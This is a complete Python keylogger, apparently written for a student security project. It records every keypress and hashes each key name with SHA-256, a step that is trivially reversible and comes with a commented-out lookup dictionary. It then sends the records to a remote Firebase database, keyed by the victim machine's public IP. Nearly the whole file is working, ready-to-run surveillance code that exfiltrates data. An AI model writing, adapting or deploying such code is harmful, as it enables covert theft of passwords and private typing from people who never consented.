import keyboard
import firebase_admin
from firebase_admin import credentials, db
import uuid
import requests
import hashlib

# Cargar la clave del servicio
cred = credentials.Certificate('./proyecto2-seguridad-75c81-firebase-adminsdk-pnjbc-be6b46646d.json')

# Inicializar la aplicación con una cuenta de servicio
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://proyecto2-seguridad-75c81-default-rtdb.firebaseio.com'
})


def obtener_ip_publica():
    response = requests.get('https://api.ipify.org')
    ip_publica = response.text
    return ip_publica

def hash_tecla(tecla_name):
    """Función para hashear la tecla usando SHA-256."""
    return hashlib.sha256(tecla_name.encode()).hexdigest()

def detectar_teclita(tecla):
    data = {'tecla': hash_tecla(tecla.name)}
    ref.push(data)  # Agrega la tecla presionada a la base de datos
    # with open('diccionario_hashes.txt', 'a') as archivo:
    #     archivo.write(f"{tecla.name}: {hash_tecla(tecla.name)}\n")

def verificar_o_crear_coleccion(nombre_coleccion):
    ref = db.reference(nombre_coleccion)
    if ref.get() is None:
        ref.set({'inicial': 'valor'})  # Crear la colección con un valor inicial
        print(f"Colección '{nombre_coleccion}' creada.")
    else:
        print(f"Colección '{nombre_coleccion}' ya existe.")

ip_publica = obtener_ip_publica()
coleccion = str(ip_publica)
coleccion = coleccion.replace(".","_")
# Uso de la función
verificar_o_crear_coleccion(coleccion)

# Referencia a la base de datos
ref = db.reference(coleccion)  # Cambia 'coleccion' por el nombre que quieras


keyboard.on_press(detectar_teclita)
keyboard.wait('esc')